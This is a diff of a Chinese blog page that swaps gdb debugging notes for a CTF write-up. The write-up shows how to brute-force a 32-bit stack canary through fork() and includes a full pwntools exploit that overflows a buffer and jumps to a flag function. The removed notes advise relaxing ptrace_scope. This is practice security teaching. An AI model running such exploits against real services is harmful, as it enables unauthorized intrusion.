@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>gdb调试总结 | sixpar&#39;s blog</title>
-  <meta name="keywords" content=" gdb ">
-  <meta name="description" content="gdb调试总结 | sixpar&#39;s blog">
+  <title>one_by_one-爆破canary值 | sixpar&#39;s blog</title>
+  <meta name="keywords" content=" Bypass-Canary ">
+  <meta name="description" content="one_by_one-爆破canary值 | sixpar&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="欢迎您的访问 想了解我？ 我只是某不知名的pwn手噢~">
 <meta property="og:type" content="website">
@@ -376,9 +376,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-gdb调试总结" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-one-by-one-爆破canary值" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">gdb调试总结</h1>
+        <h1 class="article-title">one_by_one-爆破canary值</h1>
     
     <div class="article-meta">
         
@@ -388,7 +388,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="笔记">笔记</a>
+            <a  data-rel="系列">系列</a>
             
         </span>
         
@@ -396,19 +396,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color4">gdb</a>
+            <a class="color4">Bypass-Canary</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2020-07-04 13:10:54'>2020-07-03 07:10</time>
+            Created At : <time class="date" title='Updated At: 2020-07-05 00:09:03'>2020-07-04 23:26</time>
         
     </div>
     <div class="article-meta">
         
-        <span>Count:1.3k</span>
+        <span>Count:840</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -438,7 +438,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#gdb下不同插件"><span class="toc-text">gdb下不同插件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如何调试程序"><span class="toc-text">如何调试程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#如何调试exp"><span class="toc-text">如何调试exp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#调试指令总结"><span class="toc-text">调试指令总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#gdb-peda下："><span class="toc-text">gdb-peda下：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwndbg下："><span class="toc-text">pwndbg下：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#经验："><span class="toc-text">经验：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#写在最后"><span class="toc-text">写在最后</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#说明"><span class="toc-text">说明:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#例题（-Bypass-Canary-bin1）："><span class="toc-text">*例题（&#x2F;Bypass-Canary&#x2F;bin1）：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp："><span class="toc-text">exp：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结："><span class="toc-text">总结：</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -454,126 +454,40 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="gdb下不同插件"><a href="#gdb下不同插件" class="headerlink" title="gdb下不同插件"></a>gdb下不同插件</h2><p>包含 pwndbg 、peda、gef，它们的功能各不相同，所以需要来回切换。<br>安装过程看这篇文章</p>
-<blockquote>
-<p><a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>
+        <blockquote>
+<p>这是本系列的第三篇文章，我们根据前面学过的内容我们知道了，如果在溢出的时候算准位置将Canary的值填回去便可以绕过限制。本篇将介绍如何通过逐字节爆破得到Canary的值。</p>
 </blockquote>
-<p>如果后续需要对堆进行调试分析，需要另外从下面地址安装pwndbg。</p>
-<blockquote>
-<p><a href="https://github.com/scwuaptx/Pwngdb" target="_blank" rel="noopener">https://github.com/scwuaptx/Pwngdb</a></p>
+<h2 id="说明"><a href="#说明" class="headerlink" title="说明:"></a>说明:</h2><blockquote>
+<p>●本方法只适用于32位程序。为什么呢，32位程序地址是4字节，而Canary的低字节永远是”\x00”我们是知道的，所以实际只需要爆破 3 字节即可。</p>
 </blockquote>
-<p>其主要包含有parseheap、heapinfo、chunkinfo 等一些重要的关于heap的指令。</p>
-<h2 id="如何调试程序"><a href="#如何调试程序" class="headerlink" title="如何调试程序"></a>如何调试程序</h2><p>首先得分清：<br>gdb ./filename 指的是静态调试<br>gdb attach filename 指的是动态调试</p>
-<p>比如对名为pwn的程序进行调试：</p>
+<p>所以现在明白为什么爆破法不能适用于64位程序了吧，8字节的地址，那得爆破到什么时候去。</p>
 <blockquote>
-<ul>
-<li>gdb ./pwn #开启gdb，并且file读取pwn程序</li>
-<li>b main  #对main函数下断点 </li>
-<li>b *0x8048e40  #对某一地址进行下断点</li>
-<li>b *0x56555000+0x655 #也可以基址+偏移的形式</li>
-<li>r #运行程序，在输入某次数据后可以Ctrl+c 截断下来，看此时的堆栈情况。</li>
-<li>start #以汇编的角度运行该程序，汇编代码将呈现在你眼前，另外还有寄存器和栈情况。<br>在指令“start”的基础上：</li>
-<li>n #单步执行不步入直接得结果</li>
-<li>s #单步并步入函数</li>
-<li>c #自动运行到下一个断点处</li>
-<li>got   #查看GOT表</li>
-<li>finish  #结束掉（跳过）当前函数，直接就跳到了该函数的leave ret 处</li>
-<li>q  #结束调试,或是输入detach退出</li>
-</ul>
+<p>●本方法还有一个关键前提是程序中得有一个 fork() 函数。</p>
 </blockquote>
-<h2 id="如何调试exp"><a href="#如何调试exp" class="headerlink" title="如何调试exp"></a>如何调试exp</h2><p>别人也许是用的gdb.attach()自动依附，或者是 raw_input()<br>但我个人习惯做法是在exp中想要断点的语句前 加一个 <strong>pause()</strong> ，然后gdb attach pid</p>
-<p>具体做法是：开两个终端（按shift+ctrl+t 在一个终端的基础上同界面内创建新的终端 ，而shift+ctrl+n 则是在新界面新建终端），假如exp全称为 exp.py，第一个终端输入 gdb exp.py ，然后会自动停在pause()语句处，得到调试程序的PID假如是6845，然后在第二个终端里输入 gdb attach 6845 便可。</p>
-<p>如果有多条pause语句，那么如何执行下一个pause语句？<br>第二个终端里先输入c（即continue）等待，然后Alt+1切换至第一个终端，敲一下回车，会显示停在第二个pause处，然后切换回第二个终端，按ctrl+c截断即可继续调试。</p>
-<p>个人经常使用的exp快捷键：</p>
+<p>fork()函数是用来创建子进程的。美汁汁儿~<br>注意：父进程通过 fork 函数创建的子进程的 Canary 也是相同的，fork 函数会直接拷贝父进程的内存。</p>
 <blockquote>
-<p>把选中区域全部注释掉： ctrl + /<br>令选中区域缩进： tab<br>令选中区域顶格：shift+tab</p>
+<p>●借助栈溢出漏洞，使得能覆盖到canary的地址。</p>
 </blockquote>
-<p>等等，要想 gdb attach pid 得注意：<br>ubuntu16.04 默认不允许普通用户gdb attach PID调试进程………我原先都是用root权限所以没遇到过这情况。<br>解决方法：<br>sudo vim /etc/sysctl.d/10-ptrace.conf<br>最后一行改为   kernel.yama.ptrace_scope = 0<br>去除限制！</p>
-<h2 id="调试指令总结"><a href="#调试指令总结" class="headerlink" title="调试指令总结"></a>调试指令总结</h2><p>详细的gdb调试指令请看：</p>
+<p>因此我们就可以覆盖Canary，不断试错，试对了就进入下一个字节的爆破，所以就逐个字节地将 Canary 爆破出来</p>
+<h2 id="例题（-Bypass-Canary-bin1）："><a href="#例题（-Bypass-Canary-bin1）：" class="headerlink" title="*例题（/Bypass-Canary/bin1）："></a>*例题（/Bypass-Canary/bin1）：</h2><p>file指令查看过了，是32位程序。<br>IDA分析程序，发现了main中有 fork() 函数：</p>
 <blockquote>
-<p><a href="https://blog.csdn.net/weixin_30697239/article/details/101103647" target="_blank" rel="noopener">https://blog.csdn.net/weixin_30697239/article/details/101103647</a></p>
+<p>v3 = fork();</p>
 </blockquote>
-<p>以下列出我个人使用频繁的指令</p>
-<h3 id="gdb-peda下："><a href="#gdb-peda下：" class="headerlink" title="gdb-peda下："></a>gdb-peda下：</h3><p>1.查看某一个地址(比如说0xf7e522b0)的详细信息，start，end，offset，位于哪个区域里</p>
+<p>fun函数中存在溢出漏洞。buf大小是0x70，而我们可以输入0x78。</p>
+<p>3个条件都具备了，可以利用爆破手段爆出Canary的值了。</p>
+<h3 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./bin1'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">canary_addr=<span class="string">'\x00'</span> </span><br><span class="line"><span class="comment">#低字节是\x00，我们是确定的，所以接下来只需要爆破剩余的3字节即可。</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'welcome\n'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):   <span class="comment">#3次</span></span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">		p.send(<span class="string">'a'</span>*<span class="number">100</span>+canary_addr+chr(x))   <span class="comment">#不断试错</span></span><br><span class="line">		get=p.recvuntil(<span class="string">"welcome\n"</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'recv'</span> <span class="keyword">in</span> get:</span><br><span class="line">			canary_addr+=chr(x)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">getflag=<span class="number">0x0804863B</span></span><br><span class="line">payload=<span class="string">'a'</span>*(<span class="number">0x70</span><span class="number">-0xc</span>)+ canary_addr +<span class="string">'a'</span>*<span class="number">12</span>+p32(getflag)  </span><br><span class="line"><span class="comment">#0xc是存储Canary的地方，所以我们需要填充(0x70-0xc)个字节垃圾数据。</span></span><br><span class="line"><span class="comment">#这里的canary的地址不用p32打包,因为爆破出来后没有作任何处理直接拿来用了，已经是小端序形式了。</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>执行结果截图：<br><img src="https://i.loli.net/2020/07/04/N3pefMnzWljuArR.jpg" alt="本地"></p>
+<p>注意每一次运行程序的Canary值都是不一样的，这一次爆破出来的结果是 00 9f 21 af，因此canary的值为0xaf219f00</p>
+<p>可以看到图片下方出现”get flag error”字样，这个不用管，由于我们本地路径下没有这个文件，因此调用后门函数读取不到文件是很正常的事，exp没有问题，打远程的话，远程机子上一定会在指定目录下设置好flag文件的。</p>
+<h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>关键代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):   </span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">		p.send(<span class="string">'a'</span>*<span class="number">100</span>+canary_addr+chr(x)) </span><br><span class="line">		get=p.recvuntil(<span class="string">"welcome\n"</span>)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">'recv'</span> <span class="keyword">in</span> get:</span><br><span class="line">			canary_addr+=chr(x)</span><br><span class="line">			<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<p>由于程序有fork函数，所以我们可以不断覆盖canary进行试错，错误了就触发警报退出进程，那就再fork一个子进程继续试，试对了就进入下一个字节的爆破，然后就逐个字节地将 Canary 值爆破出来。然后老样子溢出构造payload。</p>
 <blockquote>
-<p>xinfo 0xf7e522b0</p>
+<p>payload = ‘a’ * paddings + canary_addr + ‘a’ * 12 + p32(return_addr)</p>
 </blockquote>
-<p>2.查看虚拟映射内存，可以找到libc程序加载的基址，还有heap等其他地址信息</p>
-<blockquote>
-<p>vmmap </p>
-</blockquote>
-<p>3.查看地址对应内存内容</p>
-<blockquote>
-<p>x/10gx 0x80485a6   </p>
-</blockquote>
-<p>4.查看地址对应的汇编代码</p>
-<blockquote>
-<p>x/20i 0x80484b6     </p>
-</blockquote>
-<p>5.看自栈顶esp开始向下20的栈的内容</p>
-<blockquote>
-<p>stack 20   </p>
-</blockquote>
-<p>6.查看寄存器ebp-0x20的内容</p>
-<blockquote>
-<p>x/w $ebp-0x20   </p>
-</blockquote>
-<p>7.查看内容</p>
-<blockquote>
-<p>telescope 0x8049700    </p>
-</blockquote>
-<p>8.计算我们输入的格式化字符串的地址与这个地址之间的偏移</p>
-<blockquote>
-<p>fmtarg 0x7fffffffdda8     </p>
-</blockquote>
-<p>9.查看堆分布</p>
-<blockquote>
-<p>parseheap    </p>
-</blockquote>
-<p>10.查看bins情况</p>
-<blockquote>
-<p>heapinfoall       </p>
-</blockquote>
-<h3 id="pwndbg下："><a href="#pwndbg下：" class="headerlink" title="pwndbg下："></a>pwndbg下：</h3><p>1.system函数在文件中的地址，且当程序没有开启ASLR时，地址不变</p>
-<blockquote>
-<p>print system</p>
-</blockquote>
-<p>2.显示所有bin链表</p>
-<blockquote>
-<p>bins</p>
-</blockquote>
-<p>3.显示每个堆的数据结构</p>
-<blockquote>
-<p>heap</p>
-</blockquote>
-<p>4.查看plt内部函数表</p>
-<blockquote>
-<p>plt</p>
-</blockquote>
-<p>5.查看got全局函数表</p>
-<blockquote>
-<p>got</p>
-</blockquote>
-<p>6.查看寄存器信息</p>
-<blockquote>
-<p>regs</p>
-</blockquote>
-<p>7.查看stack栈</p>
-<blockquote>
-<p>stack</p>
-</blockquote>
-<p>8.打印包含返回地址的栈地址</p>
-<blockquote>
-<p>retaddr</p>
-</blockquote>
-<p>9.查看某地址的内存，左边是Hex，右边框是字符串</p>
-<blockquote>
-<p>hexdump 0x7fffd6117fee </p>
-</blockquote>
-<p>个人感觉pwndbg用起来还是挺舒服的，但我平时常用的还是gdb-peda</p>
-<h2 id="经验："><a href="#经验：" class="headerlink" title="经验："></a>经验：</h2><p>1.查找输入数据的去向<br>做一道题目时得到的启发：题目要求输入一串字符串，比如我们输入’AAABBBCCC’后ctrl+c断下来之后，<br>使用 “find AAABBBCCC”   就可以找得到字符串在内存中所储存的位置啦！</p>
-<p>2.如何应对PIE 地址随机化?<br>gdb ./pwn 打开gdb调试 ， 然后 r  加载运行程序 ， 然后在另开一个终端输入 “ps -ef |grep pwn”    得到pwn程序的PID ，然后 “cat /proc/pid/maps”  查看内存信息，得到基址，一般是第一行的start地址，那么实际地址 = 基址+IDA的相对偏移。然后再在第一个终端正在运行的程序里下断点，进行后续操作，比如输入数据后ctrl+c断下来查看内存。</p>
-<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>目前只总结出这么多，后续若有新知识，一定会更新的。<br>恰早饭去咯~</p>
+<p>注意canary之后要填充12字节的垃圾数据才到返回地址。</p>
+<p>芜湖，终于写完了。<br>–2020.7.5 0:09  &emsp;晚安</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论嗷。 </span>
